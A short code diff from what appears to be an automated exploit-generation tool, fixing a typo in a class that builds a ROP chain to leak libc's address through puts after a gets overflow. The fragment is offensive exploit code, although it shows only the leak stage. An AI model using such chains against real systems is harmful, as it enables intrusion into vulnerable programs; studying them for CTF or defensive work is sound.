@@ -57,7 +57,7 @@ class GetsVulnerability(Vulnerability):
 
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm,prefix(prefix)
+        sm.prefix(prefix)
         sm.pop_rdi(self.binary.got["gets"])
         sm.ret(binary="puts")
         sm.ret(function_addr)
